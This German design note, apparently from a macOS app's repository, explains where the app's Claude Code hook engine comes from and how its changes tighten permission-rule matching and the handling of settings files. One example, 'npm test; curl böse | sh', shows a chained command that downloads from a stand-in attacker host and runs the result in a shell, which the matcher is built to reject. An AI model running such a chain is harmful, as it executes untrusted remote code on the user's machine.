# Claude Code: Herkunft

Der Motor hinter den Claude-Sessions (alles unter `Sources/Saphir/Agenten/` ausser
`ClaudeEinstellungen.swift`, `AgentenPfade.swift` und `AgentenOptionen.swift`)
stammt aus **Agent Island**, einer eigenen Notch-App für Claude Code vom selben
Autor. Stand der Vorlage: Version 1.1.7.

## Was übernommen wurde

Unverändert in der Logik, nur umbenannt und auf Saphirs Pfade gelegt:

- `HookEvent.swift`, `AgentenModelle.swift`: das Ereignis, das ein Hook schickt, und
  die Modelle für Sessions, Freigaben und Fragen.
- `HTTPServer.swift`: der kleine lokale Server (nur Loopback, Token im Header).
- `HookInstaller.swift`, `StatuslineInstaller.swift`: tragen Hooks und Statuszeile in
  `~/.claude/settings.json` ein. Das Hook-Skript ist reines bash plus curl.
- `AgentenMotor.swift`: Buch über Sessions und offene Freigaben, hält die Hooks an,
  bis jemand entscheidet, räumt im Terminal beantwortete Fragen weg.
- `RateLimits.swift`: die echten Prozente aus dem Statuszeilen-Payload.
- `SessionIndex.swift`, `TerminalJumper.swift`, `NotifCenter.swift`: Sessionnamen,
  Sprung in den exakten Terminal-Tab (Terminal.app, iTerm2, tmux, WezTerm, kitty),
  Systemmitteilungen.

## Was Saphir selbst ist

- `Dienste/AgentDienst.swift`: die einzige Stelle, die Saphir und Motor kennt. Er
  startet den Server, übersetzt den Stand des Motors in das, was die Insel zeigt, und
  hält eine beantwortete Freigabe einen Moment mit ihrer Quittung stehen.
- `Widgets/AgentWidget.swift`, `UI/AgentenSeite.swift`: die Oberfläche.
- `Agenten/AgentenOptionen.swift`: die Einstellungen (Freigaben, Frist, Meldungen).

## Änderungen am Motor

- **Pfade und Namen:** alles unter `~/.saphir` (Skripte `saphir-hook.sh` und
  `saphir-statusline.sh`, `endpoint.json`, `token`, `rate-limits.json`), Header
  `X-Saphir-Token`, Port ab 8520. `SAPHIR_HOME` und `SAPHIR_CLAUDE_SETTINGS` verlegen
  beides für Tests.
- **Erst verbinden, dann schreiben:** Saphir fasst `~/.claude` nicht an, bevor der
  Nutzer in den Einstellungen auf Verbinden gedrückt hat. Agent Island trägt seine
  Hooks bei jedem Start ein.
- **`ClaudeEinstellungen`:** ist `settings.json` kein gültiges JSON, bricht Saphir ab,
  statt die Datei durch ein Objekt mit nur den eigenen Hooks zu ersetzen. Es wird
  nur geschrieben, wenn sich etwas ändert, vorher gibt es eine Sicherung, und die
  letzten fünf verschiedenen Stände bleiben liegen.
- **Strengerer Regelabgleich bei „Immer erlauben":** `Bash(npm test:*)` lässt
  `npm test` und `npm test --watch` durch, aber weder `npm testen` noch
  `npm test; curl böse | sh`. Befehle, die etwas verketten oder umlenken (`&`, `|`, `;`, Backticks, `<`, `>`,
  `$(`), fragen immer noch einmal. Dateiregeln vergleichen an der Ordnergrenze und lösen `..` auf, sodass
  `Edit(/Users/ich/projekt/**)` nicht auf `/Users/ich/projekt-geheim` passt. Agent
  Island vergleicht dort nur den Anfang des Textes.
- **Entfallen:** der Update-Kanal (Saphir hat keinen), die Kontingent-Schätzung aus
  den Transcripts (lag gemessen um Größenordnungen daneben, übrig bleiben Anthropics
  eigene Zahlen) und die Agent-Island-Oberfläche.
- **Klänge und Meldungen:** laufen über Saphirs `Klang` (Anlässe `fertig` und `fehler`
  sind neu) und über die Insel (`zeigeHud`).

## Hinweis zu mehreren Programmen

Der Hook `PermissionRequest` kann nur von **einem** Programm sinnvoll beantwortet
werden. Hat sich neben Saphir noch ein anderes dort eingetragen (zum Beispiel Agent
Island), fragen beide, und es gilt, wer zuerst antwortet. Dann eines von beiden
trennen.
